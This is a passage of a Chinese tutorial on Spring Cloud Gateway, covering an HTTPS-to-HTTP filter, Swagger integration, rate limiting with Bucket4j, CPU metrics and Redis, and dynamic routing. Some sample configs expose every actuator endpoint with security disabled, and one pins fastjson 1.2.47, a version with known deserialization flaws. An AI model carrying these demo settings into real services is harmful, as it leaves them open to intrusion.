LoadBalancerClientFilter.DelegatingServiceInstance(instance, overrideScheme), uri);log.trace("LoadBalancerClientFilter url chosen: " + requestUrl);exchange.getAttributes().put(ServerWebExchangeUtils.GATEWAY_REQUEST_URL_ATTR, requestUrl); 从上面的代码可以看出，LoadBalancer 对 HTTP 请求进行封装，如果从 Spring Cloud Gateway 进来的请求是 HTTPS，它就用 HTTPS 封装，如果是 HTTP 就用 HTTP 封装，而且没有预留 任何扩展修改的接口，只能通过自定义 Global Filter 的方式对其修改。下面介绍两种修改方法，在实践中任选其中一种即可。 官方 Issues 说明 https://github.com/spring-cloud/spring-cloud-gateway/issues/378 https://github.com/spring-cloud/spring-cloud-gateway/issues/160 第一种解决方案在 LoadBalancerClientFilter 执行之前将 HTTPS 修改为 HTTP 协议： 123456789101112131415161718192021222324252627282930313233343536373839@Componentpublic class HttpsToHttpFilter implements GlobalFilter, Ordered { private static final int HTTPS_TO_HTTP_FILTER_ORDER = 10099; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { URI originalUri = exchange.getRequest().getURI(); ServerHttpRequest request = exchange.getRequest(); ServerHttpRequest.Builder mutate = request.mutate(); String forwardedUri = request.getURI().toString(); if (forwardedUri != null &amp;&amp; forwardedUri.startsWith("https")) { try { URI mutatedUri = new URI("http", originalUri.getUserInfo(), originalUri.getHost(), originalUri.getPort(), originalUri.getPath(), originalUri.getQuery(), originalUri.getFragment()); mutate.uri(mutatedUri); } catch (Exception e) { throw new IllegalStateException(e.getMessage(), e); } } ServerHttpRequest build = mutate.build(); return chain.filter(exchange.mutate().request(build).build()); } /** * 由于LoadBalancerClientFilter的order是10100 * 要在LoadBalancerClientFilter执行之前将Https修改为Http，需要设置order为10099 * @return */ @Override public int getOrder() { return HTTPS_TO_HTTP_FILTER_ORDER; }} 第二种解决方案在 LoadBalancerClientFilter 执行之后将 HTTPS 修改为 HTTP，拷贝 RibbonUtils 中的 upgradeconnection 方法来自定义全局过滤器： 12345678910111213141516171819202122232425262728293031323334353637@Componentpublic class HttpSchemeFilter implements GlobalFilter, Ordered { private static final int HTTPS_TO_HTTP_FILTER_ORDER = 10101; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { Object uriObj = exchange.getAttributes().get(GATEWAY_REQUEST_URL_ATTR); if (uriObj != null) { URI uri = (URI) uriObj; uri = this.upgradeConnection(uri, "http"); exchange.getAttributes().put(GATEWAY_REQUEST_URL_ATTR, uri); } return chain.filter(exchange); } private URI upgradeConnection(URI uri, String scheme) { UriComponentsBuilder uriComponentsBuilder = UriComponentsBuilder.fromUri(uri).scheme(scheme); if (uri.getRawQuery() != null) { // When building the URI, UriComponentsBuilder verify the allowed characters and does not // support the \'+\' so we replace it for its equivalent \'%20\'. // See issue https://jira.spring.io/browse/SPR-10172 uriComponentsBuilder.replaceQuery(uri.getRawQuery().replace("+", "%20")); } return uriComponentsBuilder.build(true).toUri(); } /** * 由于LoadBalancerClientFilter的order是10100，所以设置HttpSchemeFilter的的order是10101 * 在LoadBalancerClientFilter之后将https修改为http * @return */ @Override public int getOrder() { return HTTPS_TO_HTTP_FILTER_ORDER; }} Spring Cloud Gateway 集成 SwaggerSwagger 是一个可视化 API 测试工具，可以和应用完美融合。通过声明接口注解的方式，可以方便快捷地获取 API 调试界面进行测试。Zuul 可以很方便地与 Swagger 整合在一起，由于 Spring Cloud Finchley 版是基于 Spring Boot 2.0 的，而 Spring Cloud Gateway 的底层是基于 WebFlux 实现的，且经验证，WebFlux 和 Swagger 不兼容。如果按照 Zuul 集成 Swagger 的方式，应用启动的时候会报错。下面将介绍 Spring Cloud Gateway 如何集成 Swagger，其中各个模块的说明如下。由于本案例是基于上面的 “Gateway 服务发现的路由规则案例 “ 改造而来的，因此 micro-service-eureka 工程里的配置和代码不再累述，点击下载完整的案例代码。 模块 端口 说明 micro-service-gateway-swagger N/A 聚合父 Maven 工程 micro-service-eureka 9000 Eureka 注册中心 micro-service-gateway 9001 基于 Spring Cloud Gateway 的网关服务 micro-service-provider-1 9002 服务提供者 micro-service-provider-2 9003 服务提供者 1. 创建 Micro Service Gateway 工程创建 Micro Service Gateway 工程里的 pom.xml 配置文件： 123456789101112131415161718192021222324252627282930313233343536&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 创建 Micro Service Gateway 工程里的 SwaggerProvider 类，因为 Swagger 暂不支持 WebFlux 项目，所以不能在 Gateway 中配置 SwaggerCoufig，需要编写 GatewaySwaggerProvider 实现 SwaggerResourcesProvider 接口，用于获取 SwaggerResources： 12345678910111213141516171819202122232425262728293031323334353637383940/** * @Primary注解的实例优先于其他实例被注入 */@Primary@Componentpublic class GatewaySwaggerProvider implements SwaggerResourcesProvider { private final RouteLocator routeLocator; private final GatewayProperties gatewayProperties; public static final String API_URI = "/v2/api-docs"; public GatewaySwaggerProvider(RouteLocator routeLocator, GatewayProperties gatewayProperties) { this.routeLocator = routeLocator; this.gatewayProperties = gatewayProperties; } @Override public List&lt;SwaggerResource&gt; get() { List&lt;SwaggerResource&gt; resources = new ArrayList&lt;&gt;(); List&lt;String&gt; routes = new ArrayList&lt;&gt;(); //取出Spring Cloud Gateway中的route routeLocator.getRoutes().subscribe(route -&gt; routes.add(route.getId())); //结合application.yml中的路由配置，只获取有效的route节点 gatewayProperties.getRoutes().stream().filter(routeDefinition -&gt; routes.contains(routeDefinition.getId())) .forEach(routeDefinition -&gt; routeDefinition.getPredicates().stream() .filter(predicateDefinition -&gt; ("Path").equalsIgnoreCase(predicateDefinition.getName())) .forEach(predicateDefinition -&gt; resources.add(swaggerResource(routeDefinition.getId(), predicateDefinition.getArgs().get(NameUtils.GENERATED_NAME_PREFIX + "0") .replace("/**", API_URI))))); return resources; } private SwaggerResource swaggerResource(String name, String location) { SwaggerResource swaggerResource = new SwaggerResource(); swaggerResource.setName(name); swaggerResource.setLocation(location); swaggerResource.setSwaggerVersion("2.0"); return swaggerResource; }} 创建 Micro Service Gateway 工程里的 Swagger-Resource 端点，因为没有在 Gateway 中配置 SwaggerConfig，但是运行 Swagger-UI 的时候需要依赖一些接口，所以需要建立相应的 Swagger-Resource 端点： 123456789101112131415161718192021222324252627282930313233@RestController@RequestMapping("/swagger-resources")public class SwaggerHandler { @Autowired(required = false) private SecurityConfiguration securityConfiguration; @Autowired(required = false) private UiConfiguration uiConfiguration; private final SwaggerResourcesProvider swaggerResources; @Autowired public SwaggerHandler(SwaggerResourcesProvider swaggerResources) { this.swaggerResources = swaggerResources; } @GetMapping("/configuration/security") public Mono&lt;ResponseEntity&lt;SecurityConfiguration&gt;&gt; securityConfiguration() { return Mono.just(new ResponseEntity&lt;&gt;( Optional.ofNullable(securityConfiguration).orElse(SecurityConfigurationBuilder.builder().build()), HttpStatus.OK)); } @GetMapping("/configuration/ui") public Mono&lt;ResponseEntity&lt;UiConfiguration&gt;&gt; uiConfiguration() { return Mono.just(new ResponseEntity&lt;&gt;( Optional.ofNullable(uiConfiguration).orElse(UiConfigurationBuilder.builder().build()), HttpStatus.OK)); } @GetMapping("") public Mono&lt;ResponseEntity&gt; swaggerResources() { return Mono.just((new ResponseEntity&lt;&gt;(swaggerResources.get(), HttpStatus.OK))); }} 创建 Micro Service Gateway 工程里的 GwSwaggerHeaderFilter 类，由于在路由规则为 admin/test/{a}/{b} 时，Swagger 界面上会显示为 test/{a}/{b}，缺少了 /admin 这个路由节点。通过 Debug 断点调试发现，Swagger 会根据 X-Forwarded-Prefix 这个 Header 来获取 BasePath，因此需要将它添加到接口路径与 Host 之间才能正常工作。但是 Gateway 在做转发的时候并没有将这个 Header 添加到 Request 上，从而导致接口调试出现 404 错误。为了解决该问题，需要在 Gateway 中编写一个过滤器来添加这个 Header。特别注意，Spring Boot 版本为 2.0.6 以上的可以跳过这一步骤，最新源码里 Spring Boot 修复了该 Bug，已经默认添加上了这个 Header。 1234567891011121314151617181920@Componentpublic class GwSwaggerHeaderFilter extends AbstractGatewayFilterFactory { private static final String HEADER_NAME = "X-Forwarded-Prefix"; @Override public GatewayFilter apply(Object config) { return (exchange, chain) -&gt; { ServerHttpRequest request = exchange.getRequest(); String path = request.getURI().getPath(); if (!StringUtils.endsWithIgnoreCase(path, GatewaySwaggerProvider.API_URI)) { return chain.filter(exchange); } String basePath = path.substring(0, path.lastIndexOf(GatewaySwaggerProvider.API_URI)); ServerHttpRequest newRequest = request.mutate().header(HEADER_NAME, basePath).build(); ServerWebExchange newExchange = exchange.mutate().request(newRequest).build(); return chain.filter(newExchange); }; }} 创建 Micro Service Gateway 工程里的 application.yml 配置文件，添加上面编写的 GwSwaggerHeaderFilter 过滤器， URI 指定为 lb://provider-service-1，表示负载均衡到 provider-service-1 服务。由于 Swagger 发出请求 的 URL 都是以 /xxxx 开头，因此需要使用 StripPrefix 过滤器将第一个路由节点（/xxxx）去掉。 12345678910111213141516171819202122232425262728293031323334353637383940414243server: port: 9001spring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: true routes: - id: provider-service-1 uri: lb://provider-service-1 predicates: - Path=/provider1/** filters: - GwSwaggerHeaderFilter - StripPrefix=1 - id: provider-service-2 uri: lb://provider-service-2 predicates: - Path=/provider2/** filters: - GwSwaggerHeaderFilter - StripPrefix=1eureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: truemanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 2. 创建 Micro Service Provider 1 工程创建 Micro Service Provider 1 工程里的 pom.xml 配置文件： 1234567891011121314&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; 创建 Micro Service Provider 1 工程里的 SwaggerConfig 类： 1234567891011121314151617181920212223@Configuration@EnableSwagger2public class SwaggerConfig { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) .paths(PathSelectors.any()) .build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Swagger API") .description("验证 Gateway 集成 Swagger 的效果") .termsOfServiceUrl("") .version("2.0") .build(); }} 创建 Micro Service Provider 1 工程里的测试控制类： 123456789101112131415@RestController@Api("provider-service-1 接口测试")@RequestMapping("/provider1")public class ProviderOneController { @ApiOperation(value = "计算+", notes = "加法") @ApiImplicitParams({ @ApiImplicitParam(name = "a", value = "数字a", required = true, dataType = "Long"), @ApiImplicitParam(name = "b", value = "数字b", required = true, dataType = "Long") }) @GetMapping("/{a}/{b}") public String get(@PathVariable Integer a, @PathVariable Integer b) { return "from provider service 1, the result is: " + (a + b); }} 创建 Micro Service Provider 1 工程里的 application.xml 配置文件： 1234567891011121314server: port: 9002spring: application: name: provider-service-1eureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: provider-service-1-${server.port} prefer-ip-address: true 3. 创建 Micro Service Provider 2 工程由于 Micro Service Provider 2 工程 与 Micro Service Provider 1 工程里的配置和代码都差不多，这里不再累述。 4. 测试结果 依次启动 micro-service-eureka、micro-service-provider-1、micro-service-provider-2、micro-service-gateway 应用 访问 http://127.0.0.1:9000/，查看各个服务是否都成功注册到 Eureka 访问 http://127.0.0.1:9001/swagger-ui.html，查看 Swagger 的界面是否正常工作，查看截图 在 Swagger 的界面上打开对应的 URL，输入测试数据，验证 Swagger 经过 Gateway 是否可以正常访问 Provider1 和 Provider2 服务的接口，查看截图 Spring Cloud Gateway 限流Gateway 限流概述在开发高并发系统时可以用三把利器来保护系统：缓存、降级和限流。缓存的目的是提升系统访问速度和增大系统处理的容量，是抗高并发流量的 “银弹”；而降级是当服务出现问题或者影响到核心流程时，需要暂时将其屏蔽掉，待高峰过去之后或者问题解决后再打开；而有些场景并不能用缓存和降级来解决，比如稀缺资源（秒杀、抢购）、写服务（如评论、下单）、频繁的复杂查询等，因此需要有一种手段来限制这些场景的并发 / 请求量，即限流。限流的目的是通过对并发访问 / 请求进行限速或者对一个时间窗口内的请求进行限速来保护系统，一旦达到限制速率则可以拒绝服务（定向到错误页或友好的展示页）、排队或等待（比如秒杀、评论、下单等场景）、降级（返回兜底数据或默认数据）。主流的中间件都会有单机限流框架，一般支持两种限流模式：控制速率和控制并发。Spring Cloud Zuul 通过第三方扩展 spring-cloud-zuul-ratelimit 也可以支持限流。Spring Cloud Gateway 是一个 API 网关中间件，网关是所有请求流量的入口；特别是像天猫双十一、双十二等高并发场景下，当流量迅速剧增，网关除了要保护自身之外，还要限流保护后端应用。常见的限流算法有漏桶和令牌桶，计数器也可以进行粗暴限流实现。对于限流算法，可以参考 Guava 中的 RateLimiter、Bucket4j、RateLimitJ 等项目的具体实现。下面将介绍如何基于 Bucket4j、Gateway 内置的限流过滤器工厂（RequestRateLimiterGatewayFilterFactory）、CPU 使用率实现限流，点击下载完整的案例代码。 Gateway 限流方案基于 Bucket4j 实现限流在 Spring Cloud Gateway 中实现限流比较简单，只需要编写一个过滤器就可以。下面介绍在 Spring Cloud Gateway 中使用 Bucket4j 实现限流，由于篇幅有限，只给出 Gateway Server 工程的核心代码和配置。 添加 Maven 依赖 123456789&lt;dependency&gt; &lt;groupId&gt;com.github.vladimir-bukhtoyarov&lt;/groupId&gt; &lt;artifactId&gt;bucket4j-core&lt;/artifactId&gt; &lt;version&gt;4.10.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt; 编写自定义过滤器对特定资源进行限流 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * 针对客户端IP进行限流 */public class GatewayRateLimitFilterByIp implements GatewayFilter, Ordered { private final Logger log = LoggerFactory.getLogger(GatewayRateLimitFilterByIp.class); /** * 单机网关限流用一个ConcurrentHashMap来存储 bucket， * 如果是分布式集群限流的话，可以采用 Redis等分布式解决方案 */ private static final Map&lt;String, Bucket&gt; LOCAL_CACHE = new ConcurrentHashMap&lt;&gt;(); /** * 令牌桶的最大容量，即能装载令牌的最大数量 */ int capacity; /** * 每次补充令牌的数量 */ int refillTokens; /** * 补充令牌的时间间隔 */ Duration refillDuration; public GatewayRateLimitFilterByIp() { } public GatewayRateLimitFilterByIp(int capacity, int refillTokens, Duration refillDuration) { this.capacity = capacity; this.refillTokens = refillTokens; this.refillDuration = refillDuration; } private Bucket createNewBucket() { Refill refill = Refill.greedy(refillTokens, refillDuration); Bandwidth limit = Bandwidth.classic(capacity, refill); return Bucket4j.builder().addLimit(limit).build(); } @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { String ip = exchange.getRequest().getRemoteAddress().getAddress().getHostAddress(); Bucket bucket = LOCAL_CACHE.computeIfAbsent(ip, k -&gt; createNewBucket()); log.info("IP:{} ,令牌桶可用的令牌数量:{} ", ip, bucket.getAvailableTokens()); if (bucket.tryConsume(1)) { return chain.filter(exchange); } else { //当可用的令牌数为0时，进行限流，返回429状态码 exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS); return exchange.getResponse().setComplete(); } } @Override public int getOrder() { return -1000; } // 省略Get和Set方法 ...} 通过 Java 流式 API 的方式配置路由规则，其中 http://127.0.0.1:9091/sayHello/peter/ 对应的是后端的服务，这里不再累述 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator rateLimitFilterByIp(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/rateLimit") .filters(f -&gt; f.filter(new GatewayRateLimitFilterByIp(10, 1, Duration.ofSeconds(1)))) .uri("http://127.0.0.1:9091/sayHello/peter/") .id("ratelimit_route")) .build(); }} 编写 application.yml 配置文件 123456server: port: 9090spring: application: name: gateway-server 测试结果 启动各个应用后，多次访问 http://127.0.0.1:9090/rateLimit，可以看到控制台输出如下日志信息。当可用的令牌数量为 0 时，Spring Cloud Gateway 中自定义的限流过滤器开始拒绝处理请求，直接返回 429 状态码（因为请求太多，限流返回 429 状态码）。 1234567891011121314c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:10c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:9c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:8c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:7c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:7c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:6c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:5c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:4c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:3c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:2c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:2c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:1c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:0c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,令牌桶可用的令牌数量:0 基于 CPU 的使用率进行限流在实际项目应用中对网关进行限流时，需要参考的因素比较多，可能会根据网络请求连接数、请求流量、CPU 使用率、内存使用率等进行流控。可以通过 Spring Boot Actuator 提供的 Metrics 获取当前 CPU 的使用情况，当 CPU 使用率高于某个阈值就开启限流，否则不开启限流。值得一提的是，在 Actuator 1.x 里可以通过 SystemPublicMetrics 来获取 CPU 的使用情况，但是在 Actuator 2.x 里只能通过 MetricsEndpoint 来获取。由于篇幅有限，下面只给出 Gateway Server 工程的核心代码和配置。 添加 Maven 依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 编写自定义过滤器对特定资源进行限流 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * 根据CPU的使用率限流 **/@Componentpublic class GatewayRateLimitFilterByCpu implements GatewayFilter, Ordered { @Autowired private MetricsEndpoint metricsEndpoint; private static final double MAX_USAGE = 0.50D; private static final String METRIC_NAME = "system.cpu.usage"; private final Logger log = LoggerFactory.getLogger(GatewayRateLimitFilterByCpu.class); @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { //获取网关服务所在机器的CPU使用情况 Double systemCpuUsage = metricsEndpoint.metric(METRIC_NAME, null) .getMeasurements() .stream() .filter(Objects::nonNull) .findFirst() .map(MetricsEndpoint.Sample::getValue) .filter(Double::isFinite) .orElse(0.0D); boolean isOpenRateLimit = systemCpuUsage &gt; MAX_USAGE; log.info("system.cpu.usage: {}, isOpenRateLimit:{} ", systemCpuUsage, isOpenRateLimit); if (isOpenRateLimit) { //当CPU的使用超过设置的最大阀值时，则开启限流 exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS); return exchange.getResponse().setComplete(); } else { return chain.filter(exchange); } } @Override public int getOrder() { return 0; }} 通过 Java 流式 API 的方式配置路由规则，其中 http://127.0.0.1:9091/sayHello/peter/ 对应的是后端的服务，这里不再累述 12345678910111213141516@Configurationpublic class CommonConfiguration { @Autowired private GatewayRateLimitFilterByCpu gatewayRateLimitFilterByCpu; @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/rateLimit") .filters(f -&gt; f.filter(gatewayRateLimitFilterByCpu)) .uri("http://127.0.0.1:9091/sayHello/peter/") .id("rateLimit_route") ).build(); }} 编写 application.yml 配置文件 1234567891011121314server: port: 9093spring: application: name: gateway-servermanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 测试结果 i. Linux 系统下执行压测命令 sysbench cpu --cpu-max-prime=20000 --threads=8 --time=60 run 来模拟 CPU 高负载，其中 --threads 是指 CPU 核数，--time 是指运行时间（秒）ii. 访问 http://localhost:9093/actuator/metrics/system.cpu.usage，查看网关服务所在机器的 CPU 使用情况iii. 启动各个应用后，多次访问 http://127.0.0.1:9090/rateLimit，当 CPU 使用率超过 50% 后，Spring Cloud Gateway 中自定义的限流过滤器开始拒绝处理请求，直接返回 429 状态码（因为请求太多，限流返回 429 状态码），控制台输出的日志信息如下： 12345c.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.846045400926432, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8458261370178468, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.844951044863364, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8547458051590282, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8486913849509269, isOpenRateLimit:true Gateway 内置的限流过滤器工厂Spring Cloud Gateway 内置了一个名为 RequestRateLimiterGatewayFilterFactory 的过滤器工厂，可以直接用来限流；其底层的实现依赖于 Redis，使用的算法是令牌桶算法。由于篇幅有限，下面只给出 Gateway Server 工程的核心代码和配置。 添加 Maven 依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt;&lt;/dependency&gt; 编写 RemoteAddrKeyResolver 类 123456789public class RemoteAddrKeyResolver implements KeyResolver { public static final String BEAN_NAME = "remoteAddrKeyResolver"; @Override public Mono&lt;String&gt; resolve(ServerWebExchange exchange) { return Mono.just(exchange.getRequest().getRemoteAddress().getAddress().getHostAddress()); }} 编写 CommonConfiguration 类 12345678@Configurationpublic class CommonConfiguration { @Bean(RemoteAddrKeyResolver.BEAN_NAME) public RemoteAddrKeyResolver remoteAddrKeyResolver() { return new RemoteAddrKeyResolver(); }} 编写 application.yml 配置文件，添加 Gateway 限流相关的配置内容 123456789101112131415161718192021222324252627server: port: 9092spring: application: name: gateway-server redis: host: 172.175.0.3 port: 6379 cloud: gateway: routes: - id: rateLimit_route uri: http://127.0.0.1:9091/sayHello/peter/ order: 0 predicates: - Path=/rateLimit filters: #Filter名称必须是RequestRateLimiter - name: RequestRateLimiter args: #使用SpEL按名称引用bean key-resolver: "#{@remoteAddrKeyResolver}" #允许用户每秒处理多少个请求 redis-rate-limiter.replenishRate: 1 #令牌桶的容量，允许在一秒钟内完成的最大请求数 redis-rate-limiter.burstCapacity: 5 测试结果 启动各个应用后，多次访问 http://127.0.0.1:9092/rateLimit，可以发现当请求太过频繁的时候，Spring Cloud Gateway 会直接返回 429 状态码。 基于 Sentinel 实现限流熔断降级 Sentinel 整合 Gateway Spring Cloud Gateway 的动态路由网关中有两个重要的概念，那就是路由配置和路由规则。路由配置是指配置某请求路径路由到指定的目的地址，而路由规则是指匹配到路由配置之后，再根据路由规则进行转发处理。 Spring Cloud Gateway 作为所有请求流量的入口，在实际生产环境中为了保证高可靠和高可用，以及尽量避免重启，需要实现 Spring Cloud Gateway 动态路由配置。Spring Cloud Gateway 提供了两种方法来配置路由规则（Java 流式 API、YML 配置文件），但都是在 Spring Cloud Gateway 启动时将路由配置和规则加载到内存里，无法做到不重启网关应用就可以动态地对路由的配置和规则进行增加、修改和删除操作。Spring Cloud Gateway 的官方文档并没有讲如何进行动态配置，査看 Spring Cloud Gateway 的源码，发现在 org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint 类中提供了动态配置的 Rest 接口，但是需要开启 Gateway 的端点，而且其提供的功能不是很强大。通过参考与 GatewayControllerEndpoint 相关的代码，可以自己编码实现动态路由配置。 基于 Rest API 的动态路由实现（内存版）下面将介绍 Gateway 基于 Rest API 的动态路由实现，为了方便演示，下述示例的路由配置信息默认存储在内存；若需要持久化路由配置信息（如 MySQL 持久化），可以扩展实现 RouteDefinitionRepository 接口，点击下载完整的案例代码。 添加 Maven 依赖 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt; 定义数据传输模型，分别编写 GatewayRouteDefinition、GatewayPredicateDefinition、GatewayFilterDefinition 类 1234567891011121314151617181920212223242526272829303132/** * Gateway的路由定义模型 */public class GatewayRouteDefinition { /** * 路由的Id */ private String id; /** * 路由断言集合配置 */ private List&lt;GatewayPredicateDefinition&gt; predicates = new ArrayList&lt;&gt;(); /** * 路由过滤器集合配置 */ private List&lt;GatewayFilterDefinition&gt; filters = new ArrayList&lt;&gt;(); /** * 路由规则转发的目标uri */ private String uri; /** * 路由执行的顺序 */ private int order = 0; // 省略Get和Set方法 ...} 1234567891011121314151617/** * 路由断言定义模型 */public class GatewayPredicateDefinition { /** * 断言对应的Name */ private String name; /** * 配置的断言规则 */ private Map&lt;String, String&gt; args = new LinkedHashMap&lt;&gt;(); // 省略Get和Set方法 ...} 1234567891011121314151617/** * 过滤器定义模型 */public class GatewayFilterDefinition { /** * Filter Name */ private String name; /** * 对应的路由规则 */ private Map&lt;String, String&gt; args = new LinkedHashMap&lt;&gt;(); // 省略Get和Set方法 ...} 编写动态路由的实现类 DynamicRouteServicelmpl，需要实现 ApplicationEventPublisherAware 接口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * 动态路由实现类 */@Servicepublic class DynamicRouteServiceImpl implements ApplicationEventPublisherAware { private ApplicationEventPublisher publisher; @Autowired private RouteDefinitionWriter routeDefinitionWriter; private static final Logger logger = LoggerFactory.getLogger(DynamicRouteServiceImpl.class); @Override public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) { this.publisher = applicationEventPublisher; } private void notifyChanged() { this.publisher.publishEvent(new RefreshRoutesEvent(this)); } /** * 增加路由 * * @param definition * @return */ public boolean add(RouteDefinition definition) { try { routeDefinitionWriter.save(Mono.just(definition)).subscribe(); notifyChanged(); } catch (Exception e) { logger.error("add route fail: " + e.getMessage()); return false; } return true; } /** * 更新路由 * * @param definition * @return */ public boolean update(RouteDefinition definition) { try { // 特别注意，这里一定不能执行subscribe()方法，否则更新逻辑存在Bug this.routeDefinitionWriter.delete(Mono.just(definition.getId())); } catch (Exception e) { logger.error("update 